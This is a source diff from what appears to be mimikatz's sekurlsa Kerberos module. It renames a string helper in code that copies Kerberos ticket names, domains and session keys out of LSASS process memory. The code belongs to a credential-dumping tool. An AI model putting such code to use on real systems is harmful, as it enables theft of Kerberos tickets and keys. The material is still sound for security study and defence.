@@ -675,20 +675,20 @@ PKIWI_KERBEROS_TICKET kuhl_m_sekurlsa_kerberos_createTicket(PBYTE pTicket, PKULL
 		ticket->ServiceName = *(PKERB_EXTERNAL_NAME *) (pTicket + kerbHelper[KerbOffsetIndex].offsetServiceName);
 		kuhl_m_sekurlsa_kerberos_createExternalName(&ticket->ServiceName, hLSASS);
 		ticket->DomainName = *(PUNICODE_STRING) (pTicket + kerbHelper[KerbOffsetIndex].offsetDomainName);
-		kull_m_string_getUnicodeString(&ticket->DomainName, hLSASS);
+		kull_m_process_getUnicodeString(&ticket->DomainName, hLSASS);
 
 		ticket->TargetName = *(PKERB_EXTERNAL_NAME *) (pTicket + kerbHelper[KerbOffsetIndex].offsetTargetName);
 		kuhl_m_sekurlsa_kerberos_createExternalName(&ticket->TargetName, hLSASS);
 		ticket->TargetDomainName = *(PUNICODE_STRING) (pTicket + kerbHelper[KerbOffsetIndex].offsetTargetDomainName);
-		kull_m_string_getUnicodeString(&ticket->TargetDomainName, hLSASS);
+		kull_m_process_getUnicodeString(&ticket->TargetDomainName, hLSASS);
 
 		ticket->ClientName = *(PKERB_EXTERNAL_NAME *) (pTicket + kerbHelper[KerbOffsetIndex].offsetClientName);
 		kuhl_m_sekurlsa_kerberos_createExternalName(&ticket->ClientName, hLSASS);
 		ticket->AltTargetDomainName = *(PUNICODE_STRING) (pTicket + kerbHelper[KerbOffsetIndex].offsetAltTargetDomainName);
-		kull_m_string_getUnicodeString(&ticket->AltTargetDomainName, hLSASS);
+		kull_m_process_getUnicodeString(&ticket->AltTargetDomainName, hLSASS);
 
 		ticket->Description = *(PUNICODE_STRING) (pTicket + kerbHelper[KerbOffsetIndex].offsetDescription);
-		kull_m_string_getUnicodeString(&ticket->Description, hLSASS);
+		kull_m_process_getUnicodeString(&ticket->Description, hLSASS);
 
 		ticket->KeyType = *(PLONG) ((pTicket + kerbHelper[KerbOffsetIndex].offsetKeyType));
 		ticket->Key = *(PKIWI_KERBEROS_BUFFER) ((pTicket + kerbHelper[KerbOffsetIndex].offsetKey));;
@@ -723,7 +723,7 @@ void kuhl_m_sekurlsa_kerberos_createExternalName(PKERB_EXTERNAL_NAME *pExternalN
 				aLocalBuffer.address = pTempName;
 				if(status = kull_m_memory_copy(&aLocalBuffer, &aName, i))
 					for(i = 0; status && (i < pTempName->NameCount); i++)
-						status = kull_m_string_getUnicodeString(&pTempName->Names[i], hLSASS);
+						status = kull_m_process_getUnicodeString(&pTempName->Names[i], hLSASS);
 			}
 		}
 	}
